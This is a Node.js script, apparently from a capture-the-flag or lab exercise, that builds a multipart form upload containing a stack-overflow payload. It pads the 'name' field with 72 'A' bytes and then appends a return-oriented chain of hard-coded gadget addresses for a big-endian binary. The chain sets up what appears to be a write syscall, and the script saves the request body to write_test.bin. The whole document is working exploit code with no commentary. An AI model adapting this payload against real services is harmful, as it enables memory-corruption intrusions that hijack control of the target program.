const fs = require('fs');
function be32(x){const b=Buffer.alloc(4); b.writeUInt32BE(x>>>0); return b;}
function frame(w0,w1,w2,w3){return Buffer.concat([be32(w0),be32(w1),be32(w2),be32(w3)]);}
const g_v0=0x00400a74, g_a0=0x00400a8c, g_a1=0x00400aa4, g_a2=0x00400abc, g_sys=0x00400aec;
const base=0x00411740;
let name = Buffer.concat([
  Buffer.from('A'.repeat(72),'ascii'),
  be32(g_v0),
  frame(0,0,4004,g_a0),
  frame(0,0,1,g_a1),
  frame(0,0,base,g_a2),
  frame(0,0,2,g_sys),
  frame(0,0,0x00400b04,0),
]);
let id = Buffer.concat([Buffer.from('HI\x00','binary'), Buffer.from('B'.repeat(64),'ascii')]);
const pre1=Buffer.from('------x\r\nContent-Disposition: form-data; name="name"\r\n\r\n','ascii');
const mid=Buffer.from('\r\n------x\r\nContent-Disposition: form-data; name="id_photo"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\n','ascii');
const end=Buffer.from('\r\n------x--\r\n','ascii');
const body=Buffer.concat([pre1,name,mid,id,end]);
fs.writeFileSync('write_test.bin',body);
